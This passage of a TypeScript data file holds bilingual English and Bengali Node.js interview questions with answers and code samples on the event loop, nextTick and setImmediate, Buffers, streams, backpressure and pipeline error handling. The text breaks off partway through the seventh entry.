import type { Question } from '../../types';

export const intermediateQuestions: Question[] = [
  {
    id: 'node-express-31',
    title: 'Explain the Event Loop phases (Timers, Pending Callbacks, Poll, Check, Close) in detail.',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Node.js', 'Event Loop', 'Libuv', 'Internals'],
    enAnswer: 'The Libuv event loop has six major phases: Timers (setTimeout/setInterval), Pending Callbacks (executes I/O errors/handlers), Idle/Prepare (internals), Poll (retrieves new I/O events), Check (setImmediate), and Close Callbacks (socket close events).',
    bnAnswer: 'লিবিউভির ইভেন্ট লুপে ৬টি প্রধান ধাপ বা ফেজ আছে: Timers (setTimeout/setInterval), Pending Callbacks (আই/ও এরর ও অন্যান্য কলব্যাক), Idle/Prepare (অভ্যন্তরীণ কাজ), Poll (নতুন আই/ও ইভেন্ট সংগ্রহ করা), Check (setImmediate), এবং Close Callbacks (সকেট ক্লোজ ইভেন্ট)।',
    enExplanation: `### Explanation
Conceptual phases of the Libuv Event Loop:
1. **Timers**: Executes callbacks scheduled by \`setTimeout()\` and \`setInterval()\` once the duration threshold passes.
2. **Pending Callbacks**: Executes I/O callbacks deferred from the previous loop iteration (such as TCP socket connection errors).
3. **Idle, Prepare**: Used only internally by Node.js for scheduling tasks.
4. **Poll**: Retrieves new I/O events. If the queue is empty, Node blocks here and waits, unless there are scheduled \`setImmediate\` callbacks.
5. **Check**: Executes callbacks scheduled by \`setImmediate()\`.
6. **Close Callbacks**: Handles socket destruction or close event cleanups (e.g. \`socket.on('close', ...)\`).

### Real-World Example
If you read a file (I/O event) and in the callback call \`setImmediate()\` and \`setTimeout()\`, the \`setImmediate\` callback will execute *first* in the Check phase, whereas the Timer callback must wait for the next iteration's Timers phase.

### Best Practice
Understand the phases to troubleshoot execution ordering bugs. Avoid placing heavy synchronous work inside any of these phases, as it blocks the transition to the next phase.

### Common Mistakes
Assuming that \`setTimeout(..., 0)\` will always execute before \`setImmediate()\`. In a standard script, their execution order is non-deterministic and depends on process timing.

### Code Example
\`\`\`javascript
const fs = require('fs');

fs.readFile(__filename, () => {
  // Inside I/O callback, the loop is in the Poll phase
  setTimeout(() => {
    console.log('Phase 1: Timer (setTimeout) runs next loop');
  }, 0);

  setImmediate(() => {
    console.log('Phase 5: Check (setImmediate) runs immediately in current loop');
  });
});
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
লিবিউভি ইভেন্ট লুপের মূল ধাপসমূহ:
১. **Timers**: \`setTimeout()\` ও \`setInterval()\`-এর সময় পার হওয়ার পর তাদের কলব্যাকগুলো এখানে রান করে।
২. **Pending Callbacks**: আগের লুপের পেন্ডিং বা স্থগিত থাকা আই/ও কলব্যাকগুলো (যেমন টিসিপি সকেট এরর) এখানে রান করে।
৩. **Idle, Prepare**: নোডজেএস-এর শুধুমাত্র অভ্যন্তরীণ ইন্টিগ্রেশনে ব্যবহৃদ হয়।
৪. **Poll**: নতুন আই/ও রিকোয়েস্ট কালেক্ট করে। কিউ খালি থাকলে নোডজেএস এখানে কিছুটা ব্লক হয়ে অপেক্ষা করে।
৫. **Check**: \`setImmediate()\`-এর কলব্যাকগুলো এই ধাপে রান করে।
৬. **Close Callbacks**: ক্লোজ হওয়া ইভেন্ট বা ডেস্ট্রয় সকেটের ক্লিনআপ কাজগুলো হ্যান্ডেল করে।

### বাস্তব-ভিত্তিক উদাহরণ
ফাইল রিড ইভেন্ট কলব্যাকের ভেতর যদি আপনি \`setImmediate()\` এবং \`setTimeout()\` কল করেন, তবে \`setImmediate()\` সবার আগে চেক (Check) ফেজে রান হবে, আর টাইমারকে পরবর্তী লুপের টাইমার্স ফেজ পর্যন্ত অপেক্ষা করতে হবে।

### উত্তম অনুশীলন
কোড এক্সিকিউশনের টাইমিং এরর এড়াতে এই ফ্লো-টি মাথায় রাখুন। কোনো ফেজেই হেভি সিনক্রোনাস লজিক রেখে ইভেন্ট লুপ ট্রানজিশন ব্লক করবেন না।

### সাধারণ ভুলসমূহ
মনে করা যে \`setTimeout(..., 0)\` সর্বদা \`setImmediate()\`-এর আগে রান করবে। সাধারণ মেইন লাইনে এদের সিরিয়াল রেন্ডম হতে পারে।

### Code Example
\`\`\`javascript
const fs = require('fs');

fs.readFile(__filename, () => {
  // আই/ও কলব্যাকের ভেতর লুপ এখন পোল (Poll) ফেজে আছে
  setTimeout(() => {
    console.log('ধাপ ১: টাইমার (setTimeout) পরবর্তী লুপে রান হবে');
  }, 0);

  setImmediate(() => {
    console.log('ধাপ ৫: চেক (setImmediate) বর্তমান লুপেই রান হবে');
  });
});
\`\`\``
  },
  {
    id: 'node-express-32',
    title: 'Explain process.nextTick() vs setImmediate() vs setTimeout(fn, 0).',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Node.js', 'Asynchronous', 'Event Loop', 'Execution Order'],
    enAnswer: 'process.nextTick() executes immediately after the current operation, before the event loop continues. setImmediate() executes in the Check phase of the event loop. setTimeout(fn, 0) schedules execution in the next Timers phase once the timer thread registers completion.',
    bnAnswer: 'process.nextTick() বর্তমান অপারেশনের সাথে সাথেই এবং ইভেন্ট লুপ পরবর্তী ধাপে যাওয়ার আগেই এক্সিকিউট হয়। setImmediate() ইভেন্ট লুপের Check ফেজে রান হয়। setTimeout(fn, 0) পরবর্তী লুপের Timers ফেজে রান হয়।',
    enExplanation: `### Explanation
How Node.js executes these three asynchronous APIs:
1. **\`process.nextTick(fn)\`**:
   - Not technically part of the Event Loop.
   - It runs in the **Microtask Queue** immediately after the current call stack completes, before the Event Loop transitions to the next phase.
   - If called recursively, it will starve the Event Loop by preventing it from moving forward.
2. **\`setImmediate(fn)\`**:
   - Executes during the **Check phase** of the Event Loop.
   - Designed to run immediately after the current Poll phase completes.
3. **\`setTimeout(fn, 0)\`**:
   - Executes during the **Timers phase** in the next tick of the Event Loop (minimum delay is typically ~1ms).

### Real-World Example
If you must emit an event from a constructor but want to ensure the listener has finished registering in the script first, wrapping the emit in \`process.nextTick()\` or \`setImmediate()\` ensures correct execution order.

### Best Practice
Use \`setImmediate()\` instead of \`process.nextTick()\` for most scenarios to avoid blocking the Event Loop from progressing. Use \`process.nextTick()\` only when you must execute code *immediately* after the call stack clears but before any new I/O events fire.

### Common Mistakes
Using \`process.nextTick()\` recursively for heavy tasks, which blocks the Event Loop entirely and causes memory leaks and socket timeouts.

### Code Example
\`\`\`javascript
console.log('Start');

setTimeout(() => console.log('setTimeout 0'), 0);
setImmediate(() => console.log('setImmediate'));
process.nextTick(() => console.log('nextTick'));

console.log('End');

// Expected output order:
// Start -> End -> nextTick -> setTimeout 0 (or setImmediate) -> setImmediate (or setTimeout 0)
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
নোডজেএস-এর এই তিনটি মেথড যেভাবে রান করে:
১. **\`process.nextTick(fn)\`**:
   - এটি সরাসরি ইভেন্ট লুপের অংশ নয়।
   - এটি মাইক্রোফাস্ক কিউতে রান করে। বর্তমান কল স্ট্যাক খালি হওয়ার সাথে সাথেই এবং লুপ পরবর্তী ফেজে যাওয়ার আগেই এটি রান হবে।
   - রিকার্সিভলি কল করলে এটি ইভেন্ট লুপকে আটকে বা স্টারভেশন (starvation) ঘটাতে পারে।
২. **\`setImmediate(fn)\`**:
   - এটি ইভেন্ট লুপের চেক (Check) ফেজে রান হয়। পোল ফেজ শেষ হওয়ার পরেই এটি চলে।
৩. **\`setTimeout(fn, 0)\`**:
   - এটি পরবর্তী লুপে টাইমার্স ফেজের আন্ডারে রান হয় (সাধারণত ১ মিলি সেকেন্ডের মতো নূন্যতম ডিলে থাকে)।

### বাস্তব-ভিত্তিক উদাহরণ
কনস্ট্রাক্টরের ভেতর থেকে ইভেন্ট এমিট করতে চাইলে কিন্তু লিসেনার রেজিস্টার হওয়ার জন্য সামান্য সময় দিতে চাইলে, এমিট কোডটি \`process.nextTick()\` এর মধ্যে র‍্যাপ করা নিরাপদ।

### উত্তম অনুশীলন
লুপ আটকে যাওয়া এড়াতে বেশিরভাগ ক্ষেত্রে \`process.nextTick()\` এর পরিবর্তে \`setImmediate()\` ব্যবহার করুন। শুধুমাত্র তখনই \`nextTick\` ব্যবহার করুন যখন পরবর্তী লাইনের আই/ও অপারেশনের আগেই কাজ সম্পন্ন করা জরুরি।

### সাধারণ ভুলসমূহ
রিকার্সিভলি বা লুপের ভেতর বারবার \`process.nextTick()\` কল করা, যার ফলে নোডজেএস-এর ইভেন্ট লুপ ফ্রিজ হয়ে নেটওয়ার্ক রিকোয়েস্ট টাইমআউট দেয়।

### Code Example
\`\`\`javascript
console.log('শুরু');

setTimeout(() => console.log('setTimeout 0'), 0);
setImmediate(() => console.log('setImmediate'));
process.nextTick(() => console.log('nextTick'));

console.log('শেষ');

// সঠিক আউটপুট ক্রম:
// শুরু -> শেষ -> nextTick -> (setTimeout / setImmediate) -> (setImmediate / setTimeout)
\`\`\``
  },
  {
    id: 'node-express-33',
    title: 'What are Buffers in Node.js and how do you use them?',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Node.js', 'Buffer', 'Binary Data', 'Memory'],
    enAnswer: 'A Buffer is a global class in Node.js used to handle raw binary data directly in memory. It represents a fixed-size chunk of memory allocated outside the V8 heap, commonly used when dealing with streams, files, or TCP connections.',
    bnAnswer: 'বাফার (Buffer) হলো নোডজেএস-এর একটি গ্লোবাল ক্লাস যা সরাসরি মেমোরিতে বাইনারি ডাটা হ্যান্ডেল করতে ব্যবহৃত হয়। এটি ভি৮ হিপের বাইরে একটি নির্দিষ্ট আকারের মেমোরি ব্লক নির্দেশ করে, যা মূলত ফাইল রিড-রাইট, স্ট্রিম বা সকেট অপারেশনে ব্যবহৃত হয়।',
    enExplanation: `### Explanation
Before ES6 TypedArrays, Node.js introduced \`Buffer\` to represent sequences of octets (bytes):
1. **Memory Allocation**: Buffers allocate raw memory outside V8's heap using C++ binding allocations. Their size is fixed once created and cannot change.
2. **Creation Methods**:
   - \`Buffer.from(array/string)\`: Copies data into a new buffer.
   - \`Buffer.alloc(size)\`: Allocates a zero-filled buffer of a specified size (safe, but slower).
   - \`Buffer.allocUnsafe(size)\`: Allocates memory containing old garbage data (very fast, but can leak sensitive memory if not overwritten immediately).
3. **Usage**: File uploads, network packet handling, image resizing, and cryptographic hash processing.

### Real-World Example
When reading an image file from the disk, Node doesn't parse it as a string; it yields a Buffer containing raw hex/binary bytes, which you can then pass to sharp (an image compressor) or output to HTTP.

### Best Practice
Avoid using \`Buffer.allocUnsafe()\` unless you are immediately overwriting the entire buffer with new content, as it may contain leaked application data from previously freed memory spaces.

### Common Mistakes
Assuming Buffer data can be directly compared with strings. A Buffer is an array of integers. Always use \`buffer.toString('utf8')\` or \`buffer.equals()\` to compare values.

### Code Example
\`\`\`javascript
// 1. Allocating safe buffer
const buf = Buffer.alloc(10);
console.log("Safe allocated buffer:", buf);

// 2. Creating buffer from string
const stringBuf = Buffer.from('DevPrep', 'utf8');
console.log("Buffer bytes:", stringBuf);
console.log("Raw hex:", stringBuf.toString('hex'));
console.log("String representation:", stringBuf.toString('utf8'));
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
জাভাস্ক্রিপ্টে টাইপড অ্যারে আসার আগে নোডজেএস বাইনারি বাইট হ্যান্ডেল করতে \`Buffer\` নিয়ে আসে:
১. **মেমোরি অ্যালোকেশন**: বাফার ভি৮ হিপ মেমোরির বাইরে সরাসরি ওএস থেকে মেমোরি বরাদ্দ করে। তৈরির পর এর আকার পরিবর্তন করা যায় না।
২. **তৈরির মেথডসমূহ**:
   - \`Buffer.from(data)\`: ডাটাকে বাফারে কপি করে।
   - \`Buffer.alloc(size)\`: নির্দিষ্ট সাইজের পরিষ্কার ও শূন্য দিয়ে ভরাট মেমোরি বরাদ্দ করে (নিরাপদ)।
   - \`Buffer.allocUnsafe(size)\`: রি-সাইকেল করা মেমোরি বরাদ্দ করে যেখানে পূর্বের ডাটার অবশিষ্টাংশ থাকতে পারে (অত্যন্ত দ্রুত কিন্তু মেমোরি ফাঁসের ঝুঁকি থাকে)।

### বাস্তব-ভিত্তিক উদাহরণ
ডিস্ক থেকে জেপিজি ইমেজ রিড করার সময় নোডজেএস সেটি টেক্সট আকারে রিড না করে সরাসরি বাইনারি বাফার অবজেক্ট হিসেবে মেমোরিতে ধরে রাখে, যা পরবর্তীতে রিসাইজ বা রেসপন্সে পাঠানো যায়।

### উত্তম অনুশীলন
খুব জরুরি না হলে \`Buffer.allocUnsafe()\` এড়িয়ে চলুন। এটি পূর্বে ডি-অ্যালোকেট হওয়া মেমোরি ব্যবহার করায় অসাবধানতাবশত সংবেদনশীল ডাটা (যেমন পাসওয়ার্ড) ফাঁসের ঝুঁকি তৈরি করে।

### সাধারণ ভুলসমূহ
বাফার অবজেক্টকে সরাসরি স্ট্রিংয়ের সাথে তুলনা করা। বাফার মূলত ইন্টিজারের অ্যারে। তুলনা করার আগে অবশ্যই \`buffer.toString()\` করে নিতে হবে।

### Code Example
\`\`\`javascript
// ১. নিরাপদ মেমোরি বরাদ্দ
const buf = Buffer.alloc(10);
console.log("নিরাপদ বাফার:", buf);

// ২. স্ট্রিং থেকে বাফার তৈরি
const stringBuf = Buffer.from('DevPrep', 'utf8');
console.log("বাফার বাইট সমূহ:", stringBuf);
console.log("হেক্সাডেসিমেল:", stringBuf.toString('hex'));
console.log("সাধারণ স্ট্রিং:", stringBuf.toString('utf8'));
\`\`\``
  },
  {
    id: 'node-express-34',
    title: 'Explain Streams in Node.js (Readable, Writable, Duplex, Transform).',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Node.js', 'Streams', 'Memory', 'Performance'],
    enAnswer: 'Streams are collection-handling interfaces in Node.js for processing data chunk-by-chunk. The four types are: Readable (for reading, e.g. fs.createReadStream), Writable (for writing, e.g. fs.createWriteStream), Duplex (both read and write, e.g. net.Socket), and Transform (modifies data while reading/writing, e.g. zlib.createGzip).',
    bnAnswer: 'স্ট্রিম (Streams) হলো নোডজেএস-এ চাঙ্ক-বাই-চাঙ্ক (টুকরো টুকরো) করে ডেটা প্রসেস করার ইন্টারফেস। এর ৪টি প্রকার হলো: Readable (পড়ার জন্য), Writable (লেখার জন্য), Duplex (পড়া ও লেখা উভয় কাজের জন্য, যেমন সকেট), এবং Transform (পড়ার সময় ডাটা মডিফাই করার জন্য, যেমন zlib Gzip)।',
    enExplanation: `### Explanation
Instead of loading a whole file into RAM at once, Streams read and write data in small buffers sequentially:
1. **Readable**: Source of data. Emits \`data\` events when chunks arrive, and \`end\` when finished.
2. **Writable**: Destination for data. You call \`write(chunk)\` and \`end()\` to close it.
3. **Duplex**: Implements both Readable and Writable interfaces. Example: A network TCP socket connection where you can send data out and listen for data coming in.
4. **Transform**: A type of Duplex stream where the output is calculated by modifying the input. Example: Compressing data with gzip or hashing values.

Streams prevent memory exhaustion when transferring large files.

### Real-World Example
If your server has 1GB of RAM, and 5 users request to download a 2GB video file:
- **Without streams**: Loading the 2GB file into memory for the response consumes 10GB RAM, instantly crashing the server.
- **With streams**: Node reads the file in 64KB chunks and sends them directly to the socket, consuming only ~64KB of RAM per user.

### Best Practice
Always use streams (\`fs.createReadStream()\`) for I/O operations involving large files, network responses, or proxy servers. Use \`pipeline()\` from the \`stream\` module for clean error handling.

### Common Mistakes
Listening to \`data\` events on a Readable stream without handling the stream pause/resume controls, which can lead to backpressure issues (input saturating memory before output writes finish).

### Code Example
\`\`\`javascript
const fs = require('fs');
const zlib = require('zlib');
const path = require('path');

const src = path.join(__dirname, 'source.txt');
const dest = path.join(__dirname, 'source.txt.gz');

// Write dummy file
fs.writeFileSync(src, 'Sample data to compress using streams '.repeat(100));

// Create streams
const readStream = fs.createReadStream(src);
const gzipStream = zlib.createGzip();
const writeStream = fs.createWriteStream(dest);

// Pipe: Read -> Compress -> Write
readStream.pipe(gzipStream).pipe(writeStream);

writeStream.on('finish', () => {
  console.log("File successfully zipped using Transform Stream!");
  // Clean up
  fs.unlinkSync(src);
  fs.unlinkSync(dest);
});
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
র‍্যামে পুরো ফাইল একবারে লোড না করে স্ট্রিম ডাটাকে ছোট ছোট টুকরোতে (Chunks) ভাগ করে প্রসেস করে:
১. **Readable**: যেখান থেকে ডাটা পড়া হয়। ডাটা চাঙ্ক আসলে এটি \`data\` ইভেন্ট ফায়ার করে।
২. **Writable**: যেখানে ডাটা রাইট করা হয়। এখানে \`write()\` এবং \`end()\` কল করা যায়।
৩. **Duplex**: পড়া ও লেখা উভয় কাজই করতে পারে। যেমন: টিসিপি সকেট যেখানে ডাটা রিসিভও করা যায় আবার পাঠানোও যায়।
৪. **Transform**: এক ধরনের ডুপ্লেক্স স্ট্রিম যা পড়ার সময় ডাটা চেঞ্জ করে রাইট করে। যেমন জিপ করা বা এনক্রিপ্ট করা।

### বাস্তব-ভিত্তিক উদাহরণ
সার্ভারের র‍্যাম ১ জিবি এবং ৫ জন ইউজার ২ জিবি ওজনের ভিডিও ফাইল ডাউনলোডের রিকোয়েস্ট করলেন:
- **স্ট্রিম ছাড়া**: ২ জিবির ফাইল ৫ জনের জন্য মেমোরিতে লোড করলে মোট ১০ জিবি র‍্যাম লাগবে, ফলে সার্ভার সাথে সাথেই ক্র্যাশ করবে।
- **স্ট্রিম সহ**: নোডজেএস প্রতিবারে মাত্র ৬৪ কেবি ওজনের ডাটা রিড করে সকেটে পাঠিয়ে দেয়, যার ফলে প্রতি ইউজারের জন্য মাত্র ৬৪ কেবি মেমোরি খরচ হয়।

### উত্তম অনুশীলন
বড় ফাইলের কাজ, নেটওয়ার্ক রেসপন্স বা ফাইল আপলোডের সময় সর্বদা স্ট্রিম ব্যবহার করুন। পাইপলাইন সিকিউর করতে এবং এরর ক্যাচ করতে \`stream.pipeline()\` ব্যবহার করুন।

### সাধারণ ভুলসমূহ
রাইটার রেডি হওয়ার আগেই রিডারের \`data\` ইভেন্টে অনবরত ডাটা রিড করতে থাকা, যা মেমোরি বাফার ওভারফ্লোর জন্য দায়ী (ব্যাকপ্রেসার)।

### Code Example
\`\`\`javascript
const fs = require('fs');
const zlib = require('zlib');
const path = require('path');

const src = path.join(__dirname, 'source.txt');
const dest = path.join(__dirname, 'source.txt.gz');

// ডামি ফাইল তৈরি
fs.writeFileSync(src, 'Sample data to compress using streams '.repeat(100));

const readStream = fs.createReadStream(src);
const gzipStream = zlib.createGzip();
const writeStream = fs.createWriteStream(dest);

// পাইপ ফ্লো: Read -> Gzip -> Write
readStream.pipe(gzipStream).pipe(writeStream);

writeStream.on('finish', () => {
  console.log("ট্রান্সফর্ম স্ট্রিম ব্যবহার করে ফাইলটি জিপ করা হয়েছে!");
  fs.unlinkSync(src);
  fs.unlinkSync(dest);
});
\`\`\``
  },
  {
    id: 'node-express-35',
    title: 'What is Stream backpressure and how is it handled?',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Node.js', 'Streams', 'Backpressure', 'Memory Management'],
    enAnswer: 'Backpressure occurs when data read from a source (Readable stream) is faster than it can be written to the destination (Writable stream). It is handled by pausing the Readable stream when the Writable buffer fills up, and resuming it once the Writable stream emits the "drain" event.',
    bnAnswer: 'ব্যাকপ্রেসার (Backpressure) তখনই ঘটে যখন কোনো সোর্স (Readable stream) থেকে ডাটা পড়ার গতি তার গন্তব্যে (Writable stream) লেখার গতির চেয়ে অনেক বেশি হয়। এটি সমাধান করতে রাইটার মেমোরি ফুল হলে রিডার স্ট্রিম সাময়িক পজ (pause) করা হয় এবং রাইটার খালি হলে "drain" ইভেন্টের মাধ্যমে রিডার পুনরায় চালু করা হয়।',
    enExplanation: `### Explanation
Streams have internal buffer limits (measured by \`highWaterMark\`, default is 16KB for object streams, 64KB for raw streams).
How backpressure occurs and is resolved:
1. When you write to a Writable stream using \`writer.write(chunk)\`, it returns \`false\` if the buffer threshold is breached. This is a signal: "Please stop writing, my queue is full."
2. The Readable stream must listen to this signal and call \`readable.pause()\` to stop reading from disk/source.
3. Once the system finishes draining the Writable stream's buffer to disk/network, the Writable stream emits the \`drain\` event.
4. The Readable stream listens to the \`drain\` event and calls \`readable.resume()\` to start reading chunks again.

If you use \`readable.pipe(writable)\`, Node.js handles this backpressure logic automatically under the hood.

### Real-World Example
Consider filling a narrow funnel with water: if you pour water from a bucket (fast source) faster than the funnel neck can pass it into the bottle (slow destination), the water overflows. You must pause pouring until the funnel drains.

### Best Practice
Avoid manual raw data handlers (\`on('data')\`) when transferring data between streams. Instead, use \`stream.pipeline()\` or \`.pipe()\`, which manage backpressure and release buffers safely automatically.

### Common Mistakes
Writing a custom loop to fetch data from a database and writing it to a socket using \`res.write()\` without checking the return value of \`.write()\`, leading to high memory spikes.

### Code Example
\`\`\`javascript
const fs = require('fs');
const path = require('path');

const srcFile = path.join(__dirname, 'large.txt');
const destFile = path.join(__dirname, 'copy.txt');

// Create dummy data
fs.writeFileSync(srcFile, 'Data chunk '.repeat(5000));

const reader = fs.createReadStream(srcFile);
const writer = fs.createWriteStream(destFile);

// Using pipe automatically handles backpressure:
reader.pipe(writer);

writer.on('close', () => {
  console.log("Secure copy done with backpressure safety!");
  fs.unlinkSync(srcFile);
  fs.unlinkSync(destFile);
});
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
স্ট্রিমের একটি নির্দিষ্ট মেমোরি সীমা থাকে যাকে \`highWaterMark\` বলা হয় (ডিফল্ট সাইজ ৬৪ কেবি)।
ব্যাকপ্রেসার ফ্লো যেভাবে কাজ করে:
১. রাইটার স্ট্রিমে \`writer.write(chunk)\` কল করলে বাফারের ধারণক্ষমতা পার হলে এটি \`false\` রিটার্ন করে। এর মানে হলো "মেমোরি ফুল, লেখা বন্ধ করুন"।
২. এই সিগন্যাল পেয়ে রিডারকে \`readable.pause()\` কল করে সোর্স রিডিং স্থগিত করতে হবে।
৩. রাইটার যখন ওএস বা নেটওয়ার্কে মেমোরির ডাটা সফলভাবে ডেলিভার করে খালি হবে, তখন সে \`drain\` নামক ইভেন্ট ফায়ার করবে।
৪. এই ইভেন্ট শুনে রিডার আবার \`readable.resume()\` কল করে ফাইল রিডিং চালু করবে।

আমরা যদি পাইপলাইন বা \`.pipe()\` মেথড ব্যবহার করি, তবে নোডজেএস নিজে থেকেই এই জটিলতা ব্যাকগ্রাউন্ডে সমাধান করে।

### বাস্তব-ভিত্তিক উদাহরণ
একটি ফানেলে বোতল দিয়ে পানি ঢালার মতো চিন্তা করুন: আপনি যদি বড় বালতি দিয়ে ফানেলে দ্রুত পানি ঢালেন (ফাস্ট সোর্স), ফানেল দিয়ে পানি বোতলে ঢোকার স্পিড কম হওয়ায় পানি উপচে পড়বে। আপনাকে পানি ঢালা থামাতে হবে যতক্ষণ না ফানেল খালি হয়।

### উত্তম অনুশীলন
নিজে থেকে ডাটা পুশ করে স্ট্রিম হ্যান্ডেল না করে \`stream.pipeline()\` অথবা \`.pipe()\` ব্যবহার করুন। এগুলো মেমোরি সেফটি ও ব্যাকপ্রেসার প্রোটোকল মেনে চলে।

### সাধারণ ভুলসমূহ
ডাটাবেস বা এপিআই থেকে ডাটা তুলে সরাসরি লুপের ভেতর \`res.write()\` করতে থাকা এবং মেথডটি \`false\` রিটার্ন করছে কিনা তা চেক না করা। এর ফলে সার্ভারের র‍্যাম এক লাফে অনেক বেড়ে যায়।

### Code Example
\`\`\`javascript
const fs = require('fs');
const path = require('path');

const srcFile = path.join(__dirname, 'large.txt');
const destFile = path.join(__dirname, 'copy.txt');

fs.writeFileSync(srcFile, 'Data chunk '.repeat(5000));

const reader = fs.createReadStream(srcFile);
const writer = fs.createWriteStream(destFile);

// pipe() স্বয়ংক্রিয়ভাবে ব্যাকপ্রেসার ম্যানেজ করে
reader.pipe(writer);

writer.on('close', () => {
  console.log("ব্যাকপ্রেসার সেফটি মেনে ফাইল কপি সম্পন্ন হয়েছে!");
  fs.unlinkSync(srcFile);
  fs.unlinkSync(destFile);
});
\`\`\``
  },
  {
    id: 'node-express-36',
    title: 'Explain the Stream pipe method and how to handle errors when piping streams.',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Node.js', 'Streams', 'Pipe', 'Error Handling'],
    enAnswer: 'The pipe() method connects a Readable stream to a Writable stream, managing backpressure automatically. However, pipe() does not forward errors. If an error occurs in the middle, streams do not close, causing leaks. stream.pipeline() is used to chain streams and safely handle errors in a final callback.',
    bnAnswer: 'pipe() মেথড রিডারে সাথে রাইটার যুক্ত করে ব্যাকপ্রেসার অটোমেটিক সামাল দেয়। তবে pipe() এরর ফরোয়ার্ড করতে পারে না। মাঝে কোনো এরর হলে স্ট্রিম ক্লোজ হয় না, যা মেমোরি ফাঁসের কারণ। এর বদলে stream.pipeline() ব্যবহার করে নিরাপদ এরর ক্যাচিং করা যায়।',
    enExplanation: `### Explanation
Stream piping challenges:
1. **The pipe syntax**: \`readableStream.pipe(writableStream)\` passes data from source to destination.
2. **The error limitation**: If \`readableStream\` crashes (e.g., file not found), or \`writableStream\` fails (e.g. write permissions denied), the error does not flow through the chain. The streams remain open in memory, leaking file descriptors.
3. **The Solution (\`stream.pipeline\`)**: Introduced in Node.js to solve this. It takes a list of streams, pipes them sequentially, handles cleanup automatically if any stream in the pipeline fails, and routes the final output or error to a single callback.

### Real-World Example
In file download endpoints, piping files directly to \`res\` response streams is common. If a user cancels the download midway, the connection closes, triggering a write error. Using \`pipeline()\` ensures the file read stream terminates immediately instead of leaking memory.

### Best Practice
Never use raw \`.pipe()\` in production code unless you manually attach \`error\` handlers to *every single stream* in the pipeline. Prefer \`stream/promises\` or the core \`pipeline()\` function.

### Common Mistakes
Writing \`readStream.pipe(gzip).pipe(writeStream)\` and attaching only a single error listener at the end (\`writeStream.on('error')\`). If the read stream fails, the error will go uncaught and crash the process.

### Code Example
\`\`\`javascript
const { pipeline } = require('stream');
const fs = require('fs');
const path = require('path');

const src = path.join(__dirname, 'missing.txt'); // Intentionally missing
const dest = path.join(__dirname, 'dest.txt');

const r = fs.createReadStream(src);
const w = fs.createWriteStream(dest);

// Safe piping using pipeline
pipeline(r, w, (err) => {
  if (err) {
    console.log("Pipeline failed safely! Error caught:", err.message);
  } else {
    console.log("Pipeline succeeded!");
  }
  // Clean up
  if (fs.existsSync(dest)) fs.unlinkSync(dest);
});
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
স্ট্রিম পাইপিংয়ের সীমাবদ্ধতা ও সমাধান:
১. **পাইপ মেথড**: \`readable.pipe(writable)\` ডাটা এক স্ট্রিম থেকে অন্য স্ট্রিমে পাস করে।
২. **এরর ট্র্যাকিং সমস্যা**: পাইপলাইনের মাঝে কোনো স্ট্রিম ফেইল করলে (যেমন ফাইল খুঁজে না পাওয়া) সেই এরর পরবর্তী স্ট্রিমে পৌঁছায় না। ফলে রিসোর্সগুলো মেমোরিতে ওপেন থেকে যায় যা মেমোরি লিক ঘটায়।
৩. **সমাধান (\`stream.pipeline\`)**: এটি নোডজেএস-এর একটি কোর বিল্ট-ইন মেথড। এটি একাধিক স্ট্রিমকে ক্রমানুসারে পাইপ করে এবং কোনো একটি পয়েন্টে এরর দেখা দিলে সাথে সাথে সব স্ট্রিম ডেস্ট্রয় করে দিয়ে ফাইনাল কলব্যাকে এরর পাঠিয়ে দেয়।

### বাস্তব-ভিত্তিক উদাহরণ
ফাইল ডাউনলোড এপিআই-তে ফাইলকে সরাসরি রেসপন্স সকেটে পাইপ করা হয়। ইউজার যদি মাঝপথে ডাউনলোড কেটে দেয়, তবে রাইটার কানেকশন ভেঙে যায়। এ সময় \`pipeline()\` ব্যবহার করলে রিড স্ট্রিমটিও সাথে সাথে স্টপ হয়ে মেমোরি রিফ্রেশ করে।

### উত্তম অনুশীলন
প্রোডাকশন কোডে সরাসরি \`.pipe()\` ব্যবহার করা পরিহার করুন, অথবা পাইপলাইনের প্রতিটি স্ট্রিমের সাথে আলাদা করে \`.on('error')\` হ্যান্ডলার যোগ করুন। সবচেয়ে ভালো উপায় হলো \`stream/promises\` বা \`pipeline()\` মেথড ব্যবহার করা।

### সাধারণ ভুলসমূহ
\`readStream.pipe(gzip).pipe(writeStream)\` লিখে কেবল শেষের \`writeStream\`-এ এরর হ্যান্ডলার বসানো। রিড স্ট্রিম ফেইল করলে এরর আনকচ (uncaught) থেকে গিয়ে পুরো সার্ভার ক্র্যাশ করবে।

### Code Example
\`\`\`javascript
const { pipeline } = require('stream');
const fs = require('fs');
const path = require('path');

const src = path.join(__dirname, 'missing.txt'); // ইচ্ছা করেই ফাইলটি নেই
const dest = path.join(__dirname, 'dest.txt');

const r = fs.createReadStream(src);
const w = fs.createWriteStream(dest);

// pipeline ব্যবহার করে নিরাপদ পাইপিং
pipeline(r, w, (err) => {
  if (err) {
    console.log("পাইপলাইন নিরাপদে ফেইল করেছে! এরর মেসেজ:", err.message);
  } else {
    console.log("পাইপলাইন সফল হয়েছে!");
  }
  // ক্লিনআপ
  if (fs.existsSync(dest)) fs.unlinkSync(dest);
});
\`\`\``
  },
  {
    id: 'node-express-37',
    title: 'Compare Asynchronous File Operations (Promises) vs Synchronous vs Callbacks.',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Node.js', 'File System', 'Callbacks', 'Promises'],
    enAnswer: 'Callbacks (fs.readFile) are resource-efficient but lead to callback hell. Synchronous operations (fs.readFileSync) block the thread and reduce server throughput. Promise-based operations (fs.promises.readFile) offer non-blocking execution with clean async/await readability.',
